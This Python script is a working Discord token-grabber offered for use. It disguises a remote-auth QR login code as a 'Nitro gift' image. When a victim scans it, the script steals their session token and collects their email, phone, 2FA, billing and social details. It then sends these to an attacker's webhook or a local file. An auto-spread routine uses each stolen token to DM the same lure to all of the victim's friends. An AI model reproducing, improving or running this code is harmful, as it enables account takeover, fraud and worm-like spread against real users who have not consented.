from urllib import request
import qrcode
import json
import requests
import win32clipboard
import threading
import io
from DiscordRemoteAuth import RemoteAuthClient
from PIL               import Image
from discord_webhook   import DiscordWebhook
from discord_webhook   import DiscordWebhook, DiscordEmbed
from io                import BytesIO



config = json.load(open('config.json'))


class Dump:
    def get_headers(self, token, content_type="application/json"):
        headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",      
    }
        if token:
            headers.update({"Authorization": token})
        return headers
    
    def get_details(self, token):
        data = requests.get('https://discordapp.com/api/v6/users/@me', headers=self.get_headers(token))
        return json.loads(data.text)
               
    def get_relationships(self, token):
        print('in function')
        data = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=self.get_headers(token))
        return len(json.loads(data.text))
    
    def get_guilds(self, token):
        # data = json.loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token))).read().decode())
        data = requests.get("https://discordapp.com/api/v6/users/@me/guilds", headers=self.get_headers(token))

        return len(json.loads(data.text))
        
    def get_payment(self, token):
        data = requests.get("https://discordapp.com/api/users/@me/billing/payment-sources", headers=self.get_headers(token))
        data2 = len(json.loads(data.text))
        return bool(data2)
    

    
    
    def generate_embed(self, token):
        details = self.get_details(token)
        NITRO = False
        PHONE = details['phone']
        if not PHONE:
            PHONE = False
            
        if details["flags"]:
            NITRO = True
            
        embed = DiscordEmbed()
        embed.set_author(name=f"{details['username']}#{details['discriminator']}:{details['id']}", icon_url=f"https://cdn.discordapp.com/avatars/{details['id']}/{details['avatar']}.webp?size=128")
        embed.add_embed_field(name='Token',         value=token, inline=False)
        embed.add_embed_field(name='Email',         value=details['email'], inline=False)
        embed.add_embed_field(name='Phone',         value=PHONE, inline=False)
        embed.add_embed_field(name='2FA',           value=details["mfa_enabled"])
        embed.add_embed_field(name='Nitro',         value=NITRO)
        embed.add_embed_field(name='Billing',       value=self.get_payment(token))
        embed.add_embed_field(name='Relationships', value=self.get_relationships(token))
        embed.add_embed_field(name='Guilds',        value=self.get_guilds(token))
        embed.add_embed_field(name='Age',           value="322")
        return embed
    
    def send_webhook(self, token):
        webhook = DiscordWebhook(url=config["webhook_url"], title=token)
        
        webhook.add_embed(self.generate_embed(token))
        try:
            response = webhook.execute()
        except Exception:
            print('Failed to send webhook')
            
    def open_dm(self, token, recipient):
        print("opening dm")
        payload = json.dumps({"recipients": [recipient]})
        
        data = requests.post("https://discord.com/api/v9/users/@me/channels", headers=self.get_headers(token), data=payload)
        print(json.loads(data.text)['id'] + ' dm id')
        return json.loads(data.text)['id']
    
    def image_to_byte_array(self, image:Image):
        imgByteArr = io.BytesIO()
        image.save(imgByteArr, format=image.format)
        imgByteArr = imgByteArr.getvalue()
        return imgByteArr
    
    def send_dm_nitro(self, token, nitro, recipient):
        print('Sending DM to user: ' + recipient)
        headers = self.get_headers(token)
        dm = self.open_dm(token, recipient)        
        
        #i havent used the get_headers() function as the content type header is set automatically due to it being multipart form data
        headers = {
            "Authorization": token
        }        
        data = requests.post(f"https://discord.com/api/v9/channels/{dm}/messages", headers=headers, files={"Nitro-Gift.png": self.image_to_byte_array(nitro)})
        

        print(data.text)
              
class GiftGenerator:
    def __init__(self):
        self.client = RemoteAuthClient(on_connected=self.on_connected, 
                                       on_scan=self.on_scan, 
                                       on_finish=self.on_finish, 
                                       on_close=self.on_close)
        self.threaded = False
        self.uid = None
        self.token = None
            
    def run(self, threaded, uid=None, token=None):
        self.threaded = threaded
        self.uid = uid
        self.token = token
        print("Connecting to Discord websocket...")
        self.client.run()
        
    def send_to_clipboard(self, image):
        output = BytesIO()
        image.convert('RGB').save(output, 'BMP')
        data = output.getvalue()[14:]
        output.close()

        win32clipboard.OpenClipboard()
        win32clipboard.EmptyClipboard()
        win32clipboard.SetClipboardData(win32clipboard.CF_DIB, data)
        win32clipboard.CloseClipboard()
        
    def generate_qr_code(self):
        qr = qrcode.make(f'https://discordapp.com/ra/{self.client.fingerprint}', border=2, box_size=7, version=None)
        x, y = qr.size
        nitro = Image.open("nitro.png")
        nitro.paste(qr, (250 - int(x / 2),460))
        
        #used in auto spread, saves resources. (dont need to send to clipboard if it is being done automatically)
        if not self.threaded:
            nitro.save("Nitro-Gift.png")
            self.send_to_clipboard(nitro)
            print("QR Generated & copied to clipboard.")
            return
        #auto_spread = true
        Dump().send_dm_nitro(self.token, nitro, self.uid)

    def on_connected(self):
        self.generate_qr_code()
        
    def on_scan(self):
        print("User scanned QR code, waiting for confirmation...")
    
    def on_finish(self):
        if config["save_to_txt"] == True:
                with open('tokens.txt', 'a') as f:
                    f.write(self.client.token + '\n')
                                
        if config["webhook_url"] != None:
            Dump().send_webhook(self.client.token)
            
        if config["auto_spread"] == True:            
            relationships = requests.get('https://discordapp.com/api/v6/users/@me/relationships', headers=Dump().get_headers(self.client.token))
            
            for relationship in json.loads(relationships.text):
                user = relationship['user']
                
                if relationship['type'] !=  1: #type of 1 means friend
                    continue
            
                print(f'Registering thread: userid: {user["id"]} username: {user["username"]}')
                #threaded = true, sends relationship id to dm the next victim
                thread = threading.Thread(target=GiftGenerator().run, args=(True, relationship['id'], self.client.token, )).start()
        
        
            
    def on_close(self):
        print("User failed to confirm/scan")

  
if __name__ == '__main__':
    GiftGenerator().run(threaded=False)
